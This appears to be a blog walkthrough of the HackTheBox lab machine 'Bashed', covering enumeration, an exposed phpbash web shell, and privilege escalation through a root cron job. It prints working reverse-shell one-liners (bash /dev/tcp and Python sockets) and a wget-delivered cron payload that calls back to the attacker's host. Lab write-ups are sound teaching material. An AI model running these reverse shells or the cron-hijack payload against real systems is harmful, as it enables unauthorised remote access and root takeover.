---
layout: post
title: HackTheBox Bashed 
date: 2017-12-09
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. ([Source](https://www.hackthebox.com/machines/bashed))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.0038s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/6%OT=80%CT=1%CU=40211%PV=Y%DS=2%DC=T%G=Y%TM=62249ED7
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops

TRACEROUTE (using port 110/tcp)
HOP RTT     ADDRESS
1   3.00 ms 10.10.14.1
2   4.14 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```

It seems like there’s a website…

Let’s check it out!

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bashed/website.png?raw=true)

Checking around the website showed nothing interesting.

Let’s use `dirsearch`! OwO

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bashed]
└─# dirsearch -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
...
[19:48:55] Starting: 
[19:48:55] 301 -  311B  - /images  ->  http://10.10.10.68/images/
[19:48:56] 301 -  312B  - /uploads  ->  http://10.10.10.68/uploads/
[19:48:56] 301 -  308B  - /php  ->  http://10.10.10.68/php/
[19:48:56] 301 -  308B  - /css  ->  http://10.10.10.68/css/
[19:48:57] 301 -  308B  - /dev  ->  http://10.10.10.68/dev/
[19:48:57] 301 -  307B  - /js  ->  http://10.10.10.68/js/
[19:49:01] 301 -  310B  - /fonts  ->  http://10.10.10.68/fonts/
[19:55:21] 403 -  299B  - /server-status
...
```

Looks like there is an interesting `/dev` path, let’s check it out!

![dev](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bashed/dev.png?raw=true)

Hmm… what is this `phpbash.php`?

![phpbash](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bashed/phpbash.png?raw=true)

Oh, It’s a in built bash terminal!

# Exploitation

Let’s open a netcat listener and try to execute a reverse shell :D

```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.21/1234 <&1'
```

Hmm… this doesn’t seem to work.

Let’s try using a Python reverse shell instead~

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Yay! It worked!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bashed]
└─# nc -nlvp 1234              
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.68] 58994
www-data@bashed:/var/www/html/dev$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

It seems like we can run `sudo` commands as `scriptmanager`!

Let’s test it out and execute another reverse shell (remember to open another netcat listener)!

```bash
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager whoami
scriptmanager
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
<(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'    
- Netcat Listener -

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bashed]
└─# nc -nlvp 6969              
listening on [any] 6969 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.68] 35016
scriptmanager@bashed:/var/www/html/dev$ whoami
scriptmanager
```

# Privilege Escalation

Let’s find out what files do `scriptmanager` own.

```bash
scriptmanager@bashed:/var/www/html/dev$ find / -xdev -type f -user scriptmanager 2>/dev/null;

/scripts/test.py
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
```

It seems like there’s any interesting `test.py` script :o

```bash
scriptmanager@bashed:/var/www/html/dev$ cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/var/www/html/dev$ ls -la /scripts/
ls -la /scripts/
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Mar  6 04:20 test.txt
```

The `test.txt` that is being generated from `test.py` is owned by root, which probably indicates that the cronjob is executed as root!

Now, we need to write a malicious `test.py`, host it on our server, and then use `scriptmanager` to download the file and override its original `test.py`! 

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bashed]
└─# cat test.py         
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")   

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bashed]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

- scriptmanager - 

scriptmanager@bashed:/var/www/html/dev$ cd /scripts/
scriptmanager@bashed:/scripts$ wget 10.10.14.21/test.py -O test.py

- netcat listener - (wait for the cronjob to run)

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bashed]
└─# nc -nlvp 9999       
listening on [any] 9999 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.68] 52654
root@bashed:/scripts# cd /home
root@bashed:/home# ls
arrexel  scriptmanager
root@bashed:/home# cd arrexel
root@bashed:/home/arrexel# cat user.txt
2c281f318555dbc1b856957c7147bfc1
root@bashed:/home/arrexel# cat /root/root.txt
cc4f0afe3a1026d402ba10329674a8e2
```





